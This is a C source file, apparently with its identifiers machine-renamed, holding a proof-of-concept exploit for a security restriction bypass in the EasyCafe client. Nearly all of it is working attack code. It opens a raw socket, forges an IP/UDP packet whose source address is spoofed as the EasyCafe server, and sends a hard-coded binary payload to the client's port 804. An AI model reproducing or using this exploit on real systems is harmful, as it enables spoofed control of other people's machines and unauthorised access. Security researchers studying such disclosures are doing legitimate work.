
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct udpheader {scalar_t__ checksum; void* length; void* dest_port; void* src_port; } ;
struct TYPE_2__ {void* s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; void* sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct ipheader {int ver_len; int ttl; int protocol; scalar_t__ checksum; void* destaddr; void* srcaddr; scalar_t__ flags; scalar_t__ id; void* packet_len; scalar_t__ tos; } ;
typedef int payload ;
typedef int WSADATA ;
typedef int SOCKET ;
typedef int BOOL ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int FUNC_0 (int,int ) ;
 scalar_t__ VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_1 () ;
 int FUNC_2 () ;
 scalar_t__ FUNC_3 (int ,int *) ;
 int FUNC_4 (int ) ;
 int FUNC_5 (int) ;
 void* FUNC_6 (int) ;
 void* FUNC_7 (char*) ;
 scalar_t__ FUNC_8 (unsigned char*,int) ;
 scalar_t__ FUNC_9 (unsigned int) ;
 int FUNC_10 (unsigned char*,unsigned char*,int) ;
 int FUNC_11 (unsigned char*,int ,unsigned int) ;
 int FUNC_12 (char*,...) ;
 scalar_t__ FUNC_13 (int ,unsigned char*,unsigned int,int ,struct sockaddr*,int) ;
 scalar_t__ FUNC_14 (int ,int ,int ,char*,unsigned int) ;
 int FUNC_15 (int ,int ,int ) ;

FUNC_16(int VAR_7,char **VAR_8)
 {
  unsigned int VAR_9,VAR_10 = sizeof(BOOL);
  BOOL VAR_11 = VAR_6;
  unsigned char VAR_12[]="\xFE\x00\x00\x00\x00\x00\x00\x00\x5C\xE9\x00\x00\x01"
                          "\x00\x00\x00\x3C\xFB\x12\x00\x63\x6D\xE1\x77\x46\x02"
                          "\x02\x00\x12\x02\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                          "\x00\x01\x00\x00\x00\xB2\xC1\x46\x00\x46\x02\x02\x00"
                          "\x12\x02\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x44"
                          "\xFB\x12\x00\xCA\xC1\x46\x00\xD2\xC1\x46\x00\xEC\x00"
                          "\x00\x00\x47\x01\x00\x00\xA4\x84\x77\x01\x00\x00\x00"
                          "\x00\x60\xFB\x12\x00\xA6\xB5\x45\x00\x14\x00\x00\x00"
                          "\x61\xF1\x41\x00\x80\x0B\x70\x01\x99\x00\x43\x00\xA1"
                          "\x00\x43\x00\x47\x01\x00\x00\xA0\x0B\x70\x01\xEF\xB2"
                          "\x45\x00\x60\xFB\x12\x00\x06\xB3\x45\x00\x0E\xB3\x45"
                          "\x00\x24\xFE\x12\x00\x18\xB3\x45\x00\x60\xFB\x12\x00"
                          "\xEC\x00\x00\x00\x47\x01\x00\x00\xA4\x84\x77\x01\x5C"
                          "\x04\x72\x01\x78\xFB\x12\x00\xDA\x8B\x42\x00\x84\x00"
                          "\x00\x00\x00\x00\x00\x00\x5E\x01\xD5\x01\x01\x00\x00"
                          "\x00\x98\xFB\x12\x00\xA8\x2C\xE1\x77\xE0\x02\x01\x00"
                          "\x84\x00\x00\x00\x00\x00\x00\x00\x5E\x01\xD5\x01\x47"
                          "\x01\x00\x00\xCD\xAB\xBA\xDC\xB4\xFB\x12\x00\x64\x47"
                          "\xE1\x77\x53\x0F\x80\x01\xE0\x02\x01\x00\x84\x00\x00"
                          "\x00\x00\x00\x00\x00\x5E\x01\xD5\x01\xDC\xFB\x12\x00"
                          "\x20\x47\xE1\x77\x90\x31\x8F\x00\x84\x00\x00\x00\x00"
                          "\x00\x00\x00\x30\x47\xE1\x77\x00\x00\x00\x00\x01\x00"
                          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xFC\x12"
                          "\x00\xEF\x15\xFA\x77\xEC\xFB\x12\x00\x18\x00\x00\x00"
                          "\x90\x31\x8F\x00\x84\x00\x00\x00\x00\x00\x00\x00\x5E"
                          "\x01\xD5\x01\x53\x0F\x80\x01\x35\x47\xE1\x77\xC0\xD5"
                          "\xE2\x77\xB5\x02\x0E\x00\x2E\x49\x20\x61\x6D\x20\x20"
                          "\x61\x20\x56\x75\x6C\x6E\x65\x72\x61\x62\x6C\x65\x20"
                          "\x76\x65\x72\x73\x69\x6F\x6E\x20\x6F\x66\x20\x45\x61"
                          "\x73\x79\x43\x61\x66\x65\x20\x43\x6C\x69\x65\x6E\x74"
                          "\x21\x00\x46\x02\x02\x00\x00\x00\x00\x00\x47\x01\x00"
                          "\x00\xEC\x00\x00\x00\x74\xFC\x12\x00\x88\x71\x70\x01"
                          "\xB4\xAF\x7E\x01\x68\x6E\x46\x00\x68\x01\x65\x00\x54"
                          "\xBD\x72\x01\xBC\x87\x45\x00\x54\xBD\x72\x01\x47\x01"
                          "\x00\x00\xEC\x00\x00\x00\x90\xFC\x12\x00\xEC\x87\x45"
                          "\x00\x3A\x00\x00\x00\x44\x00\x00\x00\x10\x00\x00\x00"
                          "\x01\x00\x00\x00\x10\x00\x00\x10\xB4\xFC\x12\x00\x6F"
                          "\x88\x45\x00\x3A\x00\x00\x00\x44\x00\x00\x00\x04\x02"
                          "\x00\x00\x54\xFE\x12\x00\x54\xBD\x72\x01\xEC\xFD\x12"
                          "\x00\x04\x02\x00\x00\xEC\xFD\x12\x00\xF4\x89\x45\x00"
                          "\x00\x02\x00\x00\x54\xBD\x72\x01\x54\xFE\x12\x00\xFF"
                          "\x85\x45\x00\x04\x02\x00\x00\x54\xFE\x12\x00\x54\xBD"
                          "\x72\x01\xFF\x85\x45\x00\x3C\xFF\x12\x00\x54\xFE\x12"
                          "\x00\xF0\x84\x72\x01\xEA\x04\xE2\x77\xA8\x3A\x8F\x00"
                          "\x0F\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20"
                          "\x81\xF7\x77\xAA\xAE\x46\x00\x01\x00\x00\x00\x01\x00"
                          "\x00\x00\x5C\xD4\x77\x01\xD0\xFD\x12\x00\x30\xFD\x12"
                          "\x00\xC6\xAE\x46\x00\xAA\xAE\x46\x00\x02\x00\x00\x00"
                          "\x01\x00\x00\x00\x3C\x0C\x77\x01\xD0\xFD\x12\x00\x06"
                          "\x32\x2E\x32\x2E\x31\x34\x00\xAA\xAE\x46\x00\x0A\x00"
                          "\x00\x00\x01\x00\x00\x00\x44\xF1\x77\x01\xD0\xFD\x12"
                          "\x00\x68\xFD\x12\x00\xC6\xAE\x46\x00\xAA\xAE\x46\x00"
                          "\x00\x00\x00\x00\x18\x8C\x77\x01\xA4\xFD\x12\x00\x48"
                          "\xAE\x46\x01\x88\xFD\x12\x00\x5E\x76\x46\x00\xD0\xFD"
                          "\x12\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                          "\x01\x48\xAE\x46\x00\x30\x04\x78\x01\xB8\xFD\x12\x00"
                          "\x29\x77\x46\x00\xB8\xFD\x12\x00\x00\x00\x00\x00\x54"
                          "\xFE\x12\x00\x00\x00\x00\x00\xE8\xFD\x01\x00\x0D\x00"
                          "\x00\x00\x00\x00\x00\x00\x18\x8C\x77\x01\x48\xAE\x46"
                          "\x00\x00\x00\x00\x00\xD0\xFD\x12\x00";

  unsigned char *VAR_13;
  SOCKET VAR_14;
  WSADATA VAR_15;
  struct ipheader *VAR_16;
  struct udpheader *VAR_17;
  struct sockaddr_in VAR_18;

   if(VAR_7 != 3)
   {
 FUNC_12("\n <>EasyCafe Security Restriction Bypass Vulnerability POC\n   Coded By Mobin Yazarlou\n\n");
 FUNC_12(" Usage :\n  EasyPOC <EasyCafe Server IP> <EasyCafe Client IP>\n");
    FUNC_5(0);
   }

   if(FUNC_3(FUNC_0(2,0),&VAR_15) != 0)
   {
 FUNC_12("Windows Socket API Startup Failure.\n");
    FUNC_5(-1);
   }

   VAR_14 = FUNC_15(VAR_0,VAR_5,VAR_2);

   if(FUNC_14(VAR_14,VAR_1,VAR_3,(char *) &VAR_11,VAR_10) == VAR_4)
 FUNC_12("Could not set IP_HDRINCL option.Error Num. %d\n",FUNC_2());

   VAR_18.sin_family = VAR_0;
   VAR_18.sin_addr.s_addr = FUNC_7(VAR_8[2]);
   VAR_18.sin_port = FUNC_6(804);

   VAR_9 = sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(VAR_12) - 1;
   VAR_13 = (unsigned char *) FUNC_9(VAR_9);
   FUNC_11(VAR_13,0,VAR_9);

   VAR_16 = (struct ipheader *) VAR_13;
   VAR_16->ver_len = (4 << 4) | 5;
   VAR_16->tos = 0;
   VAR_16->packet_len = FUNC_6(VAR_9);
   VAR_16->id = 0;
   VAR_16->flags = 0;
   VAR_16->ttl = 128;
   VAR_16->protocol = 0x11;
   VAR_16->checksum = 0;
   VAR_16->srcaddr = FUNC_7(VAR_8[1]);
   VAR_16->destaddr = VAR_18.sin_addr.s_addr;
   VAR_16->checksum = FUNC_8(VAR_13,sizeof(struct ipheader));

   VAR_17 = (struct udpheader *) (VAR_13 + sizeof(struct ipheader));
   VAR_17->src_port = FUNC_6(800);
   VAR_17->dest_port = FUNC_6(804);
   VAR_17->length = FUNC_6(sizeof(struct udpheader) + sizeof(VAR_12) - 1);
   VAR_17->checksum = 0;

   FUNC_10(VAR_13 + sizeof(struct ipheader) + sizeof(struct udpheader),VAR_12,sizeof(VAR_12)-1);

   if(FUNC_13(VAR_14,VAR_13,VAR_9,0,(struct sockaddr *) &VAR_18,sizeof(struct sockaddr)) == VAR_4)
   {
 FUNC_12("SendTo Function Failed.Error Num. %d\n",FUNC_2());
 if(FUNC_2() == 10004)
  FUNC_12("Local OS Denied IP Spoofing.\n");
   }
   else
    FUNC_12("Message Sent!\nPlease Check out the Client.\n");

   FUNC_4(VAR_14);
   FUNC_1();
 }
